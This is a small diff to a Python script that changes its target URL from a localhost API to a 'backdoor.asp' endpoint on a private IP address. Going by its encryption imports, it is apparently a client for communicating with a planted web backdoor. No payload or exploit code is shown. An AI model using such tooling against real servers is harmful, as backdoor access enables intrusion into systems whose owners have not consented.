@@ -11,7 +11,7 @@ from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
 
-URL = "http://localhost/api.php"
+URL = "http://192.168.193.153/backdoor.asp"
 
 resp = requests.get(URL).json()
 
